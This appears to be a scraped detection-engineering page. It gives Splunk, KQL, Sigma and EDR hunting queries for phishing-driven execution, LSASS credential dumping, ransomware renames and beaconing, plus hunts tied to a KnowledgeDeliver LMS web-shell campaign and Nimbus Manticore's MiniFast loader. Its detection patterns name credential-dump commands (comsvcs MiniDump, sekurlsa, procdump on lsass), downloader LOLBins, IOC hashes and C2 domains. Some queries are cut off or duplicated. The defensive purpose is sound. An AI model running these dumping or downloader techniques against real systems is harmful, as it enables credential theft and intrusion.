| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time

         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,
    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")

KnowledgeDeliver LMS Zero-Day Exploited to Deploy BLUEBEAM Web Shell

Cyber Security News
2026-05-25 11 use cases 3 techniques 5 kill-chain phases detected

A newly disclosed zero-day vulnerability in the KnowledgeDeliver Learning Management System (LMS) has been actively exploited in the wild to deploy the BLUEBEAM in-memory web shell, according to Mandiant&#8217;s incident response findings. The flaw, now tracked as CVE-2026-5426, enables unauthenticated remote code execution (RCE) and affects deployments that relied on default ASP.NET configuration settings prior [&#8230;] The post KnowledgeDeliver LMS Zero-Day Exploited to Deploy BLUEBEAM Web Shell appeared first on Cyber Security News .

Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Tampered LMS web content (.js/.aspx/.config) with injected remote script loader
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] ASP.NET ViewState validation failures (Event ID 1316) on KnowledgeDeliver/IIS hosts · [LLM] IIS worker w3wp.exe spawning cmd.exe / powershell.exe (web shell command execution) · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — KnowledgeDeliver LMS Zero-Day Exploited to Deploy BLUEBEAM Web Shell
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] BLUEBEAM/Godzilla web shell payload (LoadLibrary.dll, SHA-256 7c1f99dc…) on IIS host · [LLM] icacls broad permission grant launched from IIS worker lineage (host ACL weakening) · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Anomalous concatenated-browser User-Agent on inbound POSTs to IIS/.aspx (ViewState C2) · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] ASP.NET ViewState validation failures (Event ID 1316) on KnowledgeDeliver/IIS hosts Exploitation Medium
Hunts the CVE-2026-5426 ViewState deserialization exploitation primitive: forged __VIEWSTATE payloads signed with the leaked shared machineKey trigger ASP.NET Event ID 1316 'invalid ViewState' / MAC-validation entries in the Windows Application log, sometimes still resulting in a deserialization attempt. Mandiant recovered encoded BLUEBEAM payload fragments from exactly these log entries. Rationale: Article + Microsoft/Mandiant cross-reference name ASP.NET Event ID 1316 as the canonical ViewState-deserialization tell; encoded BLUEBEAM fragments were recovered from these entries. Application-log source has no Defender Advanced Hunting equivalent, hence defender_kql empty. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/ • https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability • https://www.sentinelone.com/vulnerability-database/cve-2026-5426/
ATT&CKT1190 T1552.004
Data sourcesraw WinEventLog:Application (no CIM datamodel)
Event
| where TimeGenerated > ago(7d)
| where EventLog == "Application"
| where Source startswith "ASP.NET"
| where EventID == 1316
| project TimeGenerated, Computer, Source, EventID, RenderedDescription
| order by TimeGenerated desc

[LLM] IIS worker w3wp.exe spawning cmd.exe / powershell.exe (web shell command execution) Exploitation High
Detects interactive shells spawned by the IIS worker process, the post-deserialization execution surface for CVE-2026-5426 / BLUEBEAM. [LLM] BLUEBEAM/Godzilla web shell payload (LoadLibrary.dll, SHA-256 7c1f99dc…) on IIS host Installation High
Hunts the named BLUEBEAM in-memory web-shell artifact — module/file LoadLibrary.dll with SHA-256 7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2 — loaded into or written near the IIS worker process. Catches the on-disk staging variant since BLUEBEAM is otherwise memory-resident inside w3wp.exe. Rationale: Uses the one hard IOC in the article — SHA-256 7c1f99dca8…c415ed2 / LoadLibrary.dll — scoped to w3wp.exe so it is article-specific rather than a generic hash sweep. Sentinel relies on ImFileEvent because it has no image-load table; the in-memory variant may evade both, hence the parallel w3wp child-process and Event-1316 detections. Cross-checked against: • https://asec.ahnlab.com/en/85088/ • https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/

| where InitiatingProcessFileName =~ "w3wp.exe"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine

[LLM] Tampered LMS web content (.js/.aspx/.config) with injected remote script loader Delivery Medium
Detects the watering-hole pivot: legitimate KnowledgeDeliver JavaScript/ASPX/config files modified by the IIS worker or a shell child to inject a fake 'authentication plugin' security alert and an external remote script loader, leading to downstream Cobalt Strike infections. Rationale: Article: 'legitimate JavaScript files within the LMS were tampered with to inject malicious code... loading external scripts from attacker-controlled infrastructure.' Scoping file writes to webroot .js/.aspx/.config by an IIS worker/shell parent makes it article-specific; a content grep for injected <script src> loaders is the triage follow-up. Cross-checked against: • https://cybersecuritynews.com/knowledgedeliver-lms-zero-day-exploited/

[LLM] Anomalous concatenated-browser User-Agent on inbound POSTs to IIS/.aspx (ViewState C2) Command & Control Medium
Hunts the network tell of this campaign: inbound HTTP POSTs to .aspx endpoints carrying a User-Agent formed by concatenating multiple browser signatures (multiple 'Mozilla/' tokens) — a pattern Mandiant ties to ViewState exploitation and BLUEBEAM encrypted-POST C2. Rationale: Article: 'watch for anomalous User-Agent strings, especially those formed by concatenating multiple browser signatures.' Counting repeated 'Mozilla/' tokens on POSTs to .aspx is a cheap, campaign-specific web signal; Sigma uses a simple contains since it can't count token occurrences (operators should tune to multiple-token UAs). Defender/Falcon/Datadog/CloudWatch empty — inbound IIS request User-Agent isn't in those telemetry sets. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability • https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or SHA1 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or MD5 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or SHA1 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or MD5 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Fake Oracle SQL Developer installer execution by MiniFast SHA256 · [LLM] SEO-poisoned download origin from getsqldeveloper[.]com fake SQL Developer page · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Nimbus Manticore AppDomain hijacking — .config dropped beside signed .NET binary · Scheduled task created with suspicious image / encoded args · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] MiniFast C2 beacon to Nimbus Manticore Azure Web Apps infrastructure · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains

[LLM] Nimbus Manticore AppDomain hijacking — .config dropped beside signed .NET binary Installation Medium
Hunts the MiniFast loader's AppDomain hijacking step: the weaponized SQL Developer installer writes a malicious application configuration (.exe.config/.dll.config) next to a legitimate signed .NET executable so the CLR side-loads attacker code in a trusted process context. Pivots on .config files created in user-writable paths by non-developer processes. Rationale: Targets the article's explicit AppDomain hijacking technique (CLR loading of malicious .config beside a signed .NET binary). The .config-beside-binary write in user-writable dirs by a non-build process is the high-fidelity behavioural anchor; developer-toolchain processes are excluded to cut FPs. Cross-checked against: • https://research.checkpoint.com/ • https://attack.mitre.org/techniques/T1574/014/
ATT&CKT1574.014
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(14d)
| where ActionType == "FileCreated"
| where FileName endswith ".exe.config" or FileName endswith ".dll.config"
| where FolderPath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\")
| where not(InitiatingProcessFileName in~ ("msiexec.exe","devenv.exe","msbuild.exe","dotnet.exe","nuget.exe","vbcscompiler.exe"))
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where EventType == "FileCreated"
| where TargetFileName endswith ".exe.config" or TargetFileName endswith ".dll.config"
| where TargetFilePath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\")
| where not(ActingProcessName has_any ("msiexec.exe","devenv.exe","msbuild.exe","dotnet.exe","nuget.exe","vbcscompiler.exe"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetFileName, TargetFilePath, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: AppDomain Hijack Config Dropped Beside .NET Binary (Nimbus Manticore MiniFast)
id: 4f1c2a6e-7b3d-4f8a-9c21-2d5e8a6b1f90
description: Detects creation of a .NET application configuration file (.exe.config/.dll.config) in a user-writable path by a non-developer process, consistent with Nimbus Manticore MiniFast AppDomain hijacking.
references:
  - https://cybersecuritynews.com/iranian-apt-uses-seo-poisoning/
author: SOC Detection Engineering
date: 2026/05/25
tags:
  - attack.t1574.014
  - attack.defense_evasion
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|endswith:
      - '.exe.config'
      - '.dll.config'
    TargetFilename|contains:
      - '\Users\'
      - '\AppData\'
      - '\Temp\'
      - '\Downloads\'
  filter_dev:
    Image|endswith:
      - '\msiexec.exe'
      - '\devenv.exe'
      - '\msbuild.exe'
      - '\dotnet.exe'
      - '\nuget.exe'
      - '\vbcscompiler.exe'
  condition: selection and not filter_dev
level: medium
source:windows.sysmon @EventID:11 (@TargetFilename:(*.exe.config OR *.EXE.CONFIG OR *.dll.config OR *.DLL.CONFIG)) (@TargetFilename:(*\\Users\\* OR *\\AppData\\* OR *\\Temp\\* OR *\\Downloads\\*)) -@Image:(*\\msiexec.exe OR *\\devenv.exe OR *\\msbuild.exe OR *\\dotnet.exe OR *\\nuget.exe)
#event_simpleName=FileWritten
| TargetFileName=/\.(exe|dll)\.config$/i
| regex("\\\\(Users|AppData|Temp|Downloads)\\\\", field=TargetFileName)
| NOT (ContextImageFileName=/\\(msiexec|devenv|msbuild|dotnet|nuget|vbcscompiler)\.exe$/i)
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())

[LLM] SEO-poisoned download origin from getsqldeveloper[.]com fake SQL Developer page Delivery High
Hunts files written to disk whose origin URL is the actor's fake Oracle SQL Developer download site (getsqldeveloper[.]com) or related campaign infrastructure — the SEO-poisoning delivery vector that replaced phishing email for Nimbus Manticore. Rationale: Anchors on getsqldeveloper[.]com (the article's named fake Oracle SQL Developer page) plus corroborated campaign domains, matched against the downloaded file's origin URL — directly captures the SEO-poisoning delivery the article highlights as the novel vector. Cross-checked against: • https://research.checkpoint.com/ • https://cybersecuritynews.com/iranian-apt-uses-seo-poisoning/

[LLM] MiniFast C2 beacon to Nimbus Manticore Azure Web Apps infrastructure Command & Control High
Alerts on host connections/DNS lookups to the campaign's hardcoded C2 domains — multiple *.azurewebsites[.]net subdomains plus business-startup[.]org and premierhealthadvisory[.]com — used by the MiniFast backdoor for HTTP command-and-control. Rationale: Uses the article's published C2 / infrastructure domain list (the azurewebsites[.]net subdomains and business-startup[.]org / premierhealthadvisory[.]com) — exact-domain matching of dedicated actor infrastructure is high-fidelity, and the initiating process gives an immediate pivot to the side-loaded MiniFast host. Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
